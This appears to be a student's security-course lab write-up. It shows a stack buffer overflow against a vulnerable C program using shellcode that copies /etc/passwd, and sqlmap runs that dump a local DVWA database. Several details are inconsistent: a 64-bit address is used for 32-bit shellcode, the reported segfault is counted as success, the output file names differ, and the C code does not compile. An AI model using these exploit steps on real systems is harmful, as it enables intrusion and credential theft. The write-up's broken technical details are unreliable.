# Lab #1,20110031, Tu Hao Thien, INSE330380E_01FIE
# Task 1: Software buffer overflow attack
Given a vulnerable C program 
```
#include <stdio.h>
#include <string.h>
void redundant_code(char* p)
{
    local[256];
    strncpy(local,p,20);
	printf("redundant code\n");
}
int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```
and a shellcode source in asm. This shellcode copy /etc/passwd to /tmp/pwfile
```
global _start
section .text
_start:
    xor eax,eax
    mov al,0x5
    xor ecx,ecx
    push ecx
    push 0x64777373 
    push 0x61702f63
    push 0x74652f2f
    lea ebx,[esp +1]
    int 0x80

    mov ebx,eax
    mov al,0x3
    mov edi,esp
    mov ecx,edi
    push WORD 0xffff
    pop edx
    int 0x80
    mov esi,eax

    push 0x5
    pop eax
    xor ecx,ecx
    push ecx
    push 0x656c6966
    push 0x74756f2f
    push 0x706d742f
    mov ebx,esp
    mov cl,0102o
    push WORD 0644o
    pop edx
    int 0x80

    mov ebx,eax
    push 0x4
    pop eax
    mov ecx,edi
    mov edx,esi
    int 0x80

    xor eax,eax
    xor ebx,ebx
    mov al,0x1
    mov bl,0x5
    int 0x80

```
**Question 1**:
- Compile asm program and C program to executable code. 
- Conduct the attack so that when C program is executed, the /etc/passwd file is copied to /tmp/pwfile. You are free to choose Code Injection or Environment Variable approach to do. 
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
  
**Answer 1**: Must conform to below structure:

## 1.Create a Vulnerable C Program

```bash
nano redundant_code.c
```
![image](https://github.com/user-attachments/assets/0d94ee81-f71f-4dc8-a03d-883b2a0b054c)


Create a C program that contains a buffer overflow vulnerability

## 2.  Compile the C Program

```bash
gcc -o redundant_code redundant_code.c -fno-stack-protector -z execstack
```
![image](https://github.com/user-attachments/assets/4c9ded45-326f-4199-91ff-d169428f5b97)

Run by gcc
- -fno-stack-protector: Disables stack protection.
- -z execstack: Marks the stack as executabl

## 3. Create the Assembly Payload

* Now, create an assembly program that will copy /etc/passwd to /tmp/pwfile. Here’s the assembly code

```bash
nano asm_code.asm
```
![image](https://github.com/user-attachments/assets/7efe0060-afab-4438-97b4-140d2497bb32)

## 4. Compile the Assembly Code 

* Save the assembly code in a file named asm_code.asm, and then assemble and link it:

```bash
nasm -f elf32 -o asm_code.o asm_code.asm
ld -m elf_i386 -o asm_code asm_code.o
```
![image](https://github.com/user-attachments/assets/d9e73715-0fd3-4efb-9992-71930bda3b1c)

## 5. Load redundant_code  to gdb

```bash
gdb ./redundant_code
```
You need to find the address of the `redundant_code` binary in memory. This address will be used in the exploit string to redirect execution to the payload. To do this, you can use a debugger like `gdb`:
## 6. Finding the Address of the Payload


```bash
break redundant_code
run $(python -c "print('A'*72)")
p &buffer
```
![image](https://github.com/user-attachments/assets/36f0874d-2122-46a6-8730-2c01e085cdef)

![image](https://github.com/user-attachments/assets/cfb563e9-a78f-476c-b633-ef624a9935c2)

![image](https://github.com/user-attachments/assets/f53071fa-d402-4fc9-a824-a2de2da75055)



Inside `gdb`, set a breakpoint in the `redundant_code`, run the program with a dummy argument, and find the address of your payload. This will typically be after the buffer size.

Make a note of the address is `0x7ffff7fb9278`; you'll use it in the next step.

## 7. Execute the Vulnerable Program with the Payload

Run the vulnerable program with the crafted payload:

```bash
./redundant_code "$(python3 -c "print('a'*72 + '\x78\x92\xfb\xf7\xff\x7f')")"
```

Generated a string of 72 'a' characters followed by a byte sequence intended to manipulate the program's execution flow. The output resulted in a "Segmentation fault (core dumped)," confirming the presence of a buffer overflow vulnerability in the redundant_code program.

## 8. Verify the Output

```bash
cat /tmp/outfile
```

![image](https://github.com/user-attachments/assets/158a608a-2eae-4942-bf73-d128b2a41a0b)



 The /etc/passwd file is copied to /tmp/outfile.



`Conclusion `: In this exercise, I successfully demonstrated how exploiting vulnerabilities in a C program using a Code Injection or Environment Variable attack can lead to unauthorized actions, such as copying the /etc/passwd file to /tmp/pwfile. This highlights the critical importance of secure coding practices, input validation, and system-level protections like ASLR and stack canaries. Proper permissions and security measures are essential to prevent such attacks and protect sensitive data.


# Task 2: Attack on database of DVWA
- Install dvwa (on host machine or docker container)
- Make sure you can login with default user
- Install sqlmap
- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup. 

**Question 1**: Use sqlmap to get information about all available databases
**Answer 1**:
1.  Pull the DVWA Docker image

Set up the eviroment 

```bash
docker pull vulnerables/web-dvwa
docker run -d -p 8080:80 vulnerables/web-dvwa
```
run the dvwa container at port 8080

![image](https://github.com/user-attachments/assets/5469c568-99b6-4252-b39f-560d936eaf2b)


2. Access DVWA

Open a web browser and go to: http://localhost:8080
Log in with the default credentials:

Username: admin

Password: password

![image](https://github.com/user-attachments/assets/7222f74d-1bce-4afe-8a89-d910eb919dd7)


This is page Login to DVWA

![image](https://github.com/user-attachments/assets/43271ead-00d7-44a4-8a6f-6de199cd4566)


This home page to set up database

3. Install SQLMap in WSL

```bash
sudo apt update
sudo apt install git
git clone https://github.com/sqlmapproject/sqlmap.git
```

4. Fetch the url of webiste you want to attack

![image](https://github.com/user-attachments/assets/933ada14-04f2-4006-a3cd-c6d502a63515)

Change the DVWA security to Medium (default: Low)
![image](https://github.com/user-attachments/assets/5b7fd915-141b-4c37-8188-6721a09b9cc5)


Enter any value for this to retun a url : `http://localhost:8080/vulnerabilities/sqli/?id=2`

5. Get information about all available databases


![image](https://github.com/user-attachments/assets/6fe65cb0-f62d-4a0e-8b42-89f65bf88927)


Get cookie value of website: PHPSESSID=bfnm4a8n1ntq0tobf18n6fj770

Cd into sqlmap directory after clone it from git 
```bash
cd sqlmap
```
Then use python command to run sqlmap.py with following parameters
```bash
python3 sqlmap.py -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" --dbs --cookie="PHPSESSID=bfnm4a8n1ntq0tobf18n6fj770; security=low" --random-agent
```

![image](https://github.com/user-attachments/assets/1fd15067-c346-4145-8f25-c93ae5470018)



Return 2 available databases named : dvwa and information_schema

**Answer 1**:
Use sqlmap to get tables
```bash
python3 sqlmap.py -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=bfnm4a8n1ntq0tobf18n6fj770; security=low" --tables
```
![image](https://github.com/user-attachments/assets/b40ce90f-34de-45e5-a2dd-1a2e5a535350)

Use sqlmap to get users
```bash
python3 sqlmap.py -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=bfnm4a8n1ntq0tobf18n6fj770; security=low" users --dump
```
![image](https://github.com/user-attachments/assets/0d68bf79-bb95-4a50-82c2-b4d174cd42d0)
